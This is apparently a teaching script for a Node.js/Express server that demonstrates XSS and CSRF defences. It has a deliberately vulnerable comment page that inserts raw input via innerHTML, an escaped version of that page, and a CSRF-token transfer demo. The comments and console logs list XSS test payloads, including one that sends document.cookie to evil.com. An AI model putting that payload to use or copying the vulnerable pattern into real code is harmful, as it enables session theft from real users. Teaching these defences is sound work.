/**
 * XSS与CSRF防护演示
 *
 * 运行方式：
 * 1. npm install express helmet csurf cookie-parser ejs
 * 2. node xss-csrf-demo.js
 * 3. 浏览器访问 http://localhost:8000
 */

const express = require('express');
const helmet = require('helmet');
const csurf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();

// ==================== 基础中间件 ====================
app.use(helmet({
  contentSecurityPolicy: false  // 关闭CSP以允许演示代码运行（生产环境应该开启）
}));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(cookieParser());

// ==================== CSRF防护 ====================
const csrfProtection = csurf({ cookie: true });

// 获取CSRF Token的接口
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// ==================== 演示1：XSS攻击场景 ====================
app.get('/demo/xss/vulnerable', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>XSS攻击演示 - 漏洞版本</title>
      <style>
        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .demo-box { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
        button:hover { background: #c82333; }
        .result { margin-top: 20px; padding: 15px; background: #fff3cd; border-left: 4px solid #ffc107; }
        .warning { color: #dc3545; font-weight: bold; }
      </style>
    </head>
    <body>
      <h1>⚠️ XSS攻击演示 - 漏洞版本</h1>

      <div class="demo-box">
        <h2>评论区（有XSS漏洞）</h2>
        <p class="warning">⚠️ 警告：这个页面有XSS漏洞，不要输入真实Cookie！</p>

        <textarea id="comment" rows="3" placeholder="输入评论内容..."></textarea>
        <button onclick="submitComment()">发布评论</button>

        <div id="comments"></div>
      </div>

      <script>
        function submitComment() {
          const comment = document.getElementById('comment').value;

          // ❌ 危险：直接将用户输入插入HTML
          const commentsDiv = document.getElementById('comments');
          commentsDiv.innerHTML = '<div class="result">' + comment + '</div>';

          // 测试用例1：<script>alert('XSS')</script>
          // 测试用例2：<img src=x onerror="alert('XSS')">
          // 测试用例3：<script>document.location='http://evil.com?cookie='+document.cookie</script>
        }

        // 显示测试提示
        console.log('%c XSS攻击测试用例：', 'color: red; font-size: 16px;');
        console.log('1. <script>alert("XSS")</script>');
        console.log('2. <img src=x onerror="alert("XSS")">');
        console.log('3. <script>document.location="http://evil.com?cookie="+document.cookie</script>');
      </script>
    </body>
    </html>
  `);
});

// ==================== 演示2：XSS防护版本 ====================
app.get('/demo/xss/protected', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>XSS攻击演示 - 防护版本</title>
      <style>
        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .demo-box { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #28a745; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
        button:hover { background: #218838; }
        .result { margin-top: 20px; padding: 15px; background: #d4edda; border-left: 4px solid #28a745; }
        .safe { color: #28a745; font-weight: bold; }
      </style>
    </head>
    <body>
      <h1>🛡️ XSS攻击演示 - 防护版本</h1>

      <div class="demo-box">
        <h2>评论区（XSS防护）</h2>
        <p class="safe">✅ 安全：所有输入都会被转义</p>

        <textarea id="comment" rows="3" placeholder="输入评论内容..."></textarea>
        <button onclick="submitComment()">发布评论</button>

        <div id="comments"></div>
      </div>

      <script>
        // HTML转义函数
        function escapeHtml(unsafe) {
          return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
        }

        function submitComment() {
          const comment = document.getElementById('comment').value;

          // ✅ 安全：转义HTML标签
          const escapedComment = escapeHtml(comment);

          const commentsDiv = document.getElementById('comments');
          commentsDiv.innerHTML = '<div class="result">' + escapedComment + '</div>';

          // 测试：<script>alert('XSS')</script>
          // 结果：&lt;script&gt;alert('XSS')&lt;/script&gt;（不会执行）
        }

        console.log('%c XSS防护测试：', 'color: green; font-size: 16px;');
        console.log('尝试输入：<script>alert("XSS")</script>');
        console.log('结果：会被转义为 &lt;script&gt;alert("XSS")&lt;/script&gt;');
      </script>
    </body>
    </html>
  `);
});

// ==================== 演示3：CSRF防护 ====================
app.get('/demo/csrf', csrfProtection, (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSRF攻击演示</title>
      <style>
        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .demo-box { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #0056b3; }
        .result { margin-top: 20px; padding: 15px; background: #d1ecf1; border-left: 4px solid #17a2b8; }
        .error { background: #f8d7da; border-left-color: #dc3545; }
        .token { background: #fff3cd; border-left-color: #ffc107; }
      </style>
    </head>
    <body>
      <h1>🛡️ CSRF防护演示</h1>

      <div class="demo-box">
        <h2>模拟转账功能</h2>
        <p>这个接口需要CSRF Token保护</p>

        <button onclick="transferWithToken()">✅ 带Token转账（成功）</button>
        <button onclick="transferWithoutToken()">❌ 不带Token转账（失败）</button>

        <div id="result"></div>
      </div>

      <div class="demo-box">
        <h2>当前CSRF Token</h2>
        <button onclick="showToken()">查看Token</button>
        <div id="token-display" class="token" style="display:none; margin-top:10px; padding:10px;"></div>
      </div>

      <script>
        // 从服务器获取CSRF Token
        let csrfToken = '';

        fetch('/api/csrf-token')
          .then(res => res.json())
          .then(data => {
            csrfToken = data.csrfToken;
            console.log('CSRF Token已获取:', csrfToken);
          });

        // ✅ 带CSRF Token的请求（成功）
        function transferWithToken() {
          fetch('/api/transfer', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': csrfToken  // 关键：携带Token
            },
            body: JSON.stringify({ to: 'user123', amount: 100 })
          })
          .then(res => res.json())
          .then(data => {
            document.getElementById('result').innerHTML =
              '<div class="result">✅ 转账成功！</div>';
          })
          .catch(err => {
            document.getElementById('result').innerHTML =
              '<div class="result error">❌ 错误：' + err.message + '</div>';
          });
        }

        // ❌ 不带CSRF Token的请求（失败）
        function transferWithoutToken() {
          fetch('/api/transfer', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
              // 注意：没有X-CSRF-Token头
            },
            body: JSON.stringify({ to: 'hacker', amount: 999999 })
          })
          .then(res => res.json())
          .then(data => {
            document.getElementById('result').innerHTML =
              '<div class="result">✅ 转账成功！</div>';
          })
          .catch(err => {
            document.getElementById('result').innerHTML =
              '<div class="result error">❌ 错误：' + err.message + '</div>';
            console.error('CSRF防护生效：请求被拒绝');
          });
        }

        function showToken() {
          const tokenDisplay = document.getElementById('token-display');
          tokenDisplay.style.display = 'block';
          tokenDisplay.textContent = 'CSRF Token: ' + csrfToken;
        }

        console.log('%c CSRF防护测试：', 'color: blue; font-size: 16px;');
        console.log('1. 点击"带Token转账" - 应该成功');
        console.log('2. 点击"不带Token转账" - 应该失败（CSRF保护）');
      </script>
    </body>
    </html>
  `);
});

// ==================== API：模拟转账接口（需要CSRF Token） ====================
app.post('/api/transfer', csrfProtection, (req, res) => {
  // csrfProtection中间件会自动验证CSRF Token
  // 如果Token不匹配，返回403错误

  const { to, amount } = req.body;

  console.log('转账请求:', { to, amount });
  console.log('CSRF Token已验证');

  res.json({
    success: true,
    message: `转账成功：向 ${to} 转账 ${amount} 元`
  });
});

// ==================== 首页 ====================
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>XSS与CSRF防护演示</title>
      <style>
        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .nav { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .nav a { display: inline-block; margin: 10px; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 4px; }
        .nav a:hover { background: #0056b3; }
        .danger { background: #dc3545; }
        .safe { background: #28a745; }
      </style>
    </head>
    <body>
      <h1>🛡️ XSS与CSRF防护演示</h1>

      <div class="nav">
        <a href="/demo/xss/vulnerable" class="danger">⚠️ XSS攻击演示（漏洞版）</a>
        <a href="/demo/xss/protected" class="safe">✅ XSS防护演示</a>
        <a href="/demo/csrf">🛡️ CSRF防护演示</a>
      </div>

      <h2>演示说明</h2>
      <ul>
        <li><strong>XSS攻击演示（漏洞版）</strong>：展示XSS攻击的危害</li>
        <li><strong>XSS防护演示</strong>：展示如何正确防护XSS</li>
        <li><strong>CSRF防护演示</strong>：展示CSRF Token的使用</li>
      </ul>

      <h2>安全提示</h2>
      <p>⚠️ 这些演示仅用于学习目的，不要在生产环境使用漏洞版本！</p>
    </body>
    </html>
  `);
});

const PORT = 8000;
app.listen(PORT, () => {
  console.log(`\n🚀 XSS与CSRF防护演示服务器运行在 http://localhost:${PORT}`);
  console.log(`\n💡 演示页面：`);
  console.log(`  - 首页：http://localhost:${PORT}/`);
  console.log(`  - XSS攻击演示（漏洞版）：http://localhost:${PORT}/demo/xss/vulnerable`);
  console.log(`  - XSS防护演示：http://localhost:${PORT}/demo/xss/protected`);
  console.log(`  - CSRF防护演示：http://localhost:${PORT}/demo/csrf`);
  console.log(`\n⚠️  警告：仅用于学习，不要在生产环境使用！\n`);
});
